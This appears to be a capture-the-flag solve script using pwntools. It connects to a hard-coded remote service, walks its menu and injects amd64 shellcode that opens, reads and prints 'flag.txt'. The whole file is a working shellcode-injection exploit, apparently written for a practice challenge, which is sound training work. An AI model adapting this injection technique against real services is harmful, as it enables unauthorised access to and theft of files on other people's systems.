#!/usr/bin/python3

from pwn import remote, asm, context

HOST = "94.237.57.211"
PORT = 40894

context.arch = 'amd64'

# Connect to the remote service
p = remote(HOST, PORT)

# Navigate the menu as described in the writeup
p.sendlineafter(b"all!\n> ", b'1')
p.sendlineafter(b"\xf0\x9f\x8f\xb9\n> ", b'2')

# The shellcode from the writeup
shellcode = asm('''
    push r10
    inc r10
    mov rax, r10
    lea rdi, [rip+31]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rsi, rdi
    mov rdi, rax
    xor rax, rax
    mov rdx, r11
    syscall

    mov rdx, rax
    pop rax
    mov rdi, rax
    syscall
''')

# The payload is the shellcode followed by the filename
payload = shellcode + b"flag.txt"

# Send the payload
p.sendafter(b"weapon?\n> ", payload)

# Receive and print the flag
try:
    flag = p.recvall(timeout=5)
    print(flag.decode())
except Exception as e:
    print(f"An error occurred: {e}")
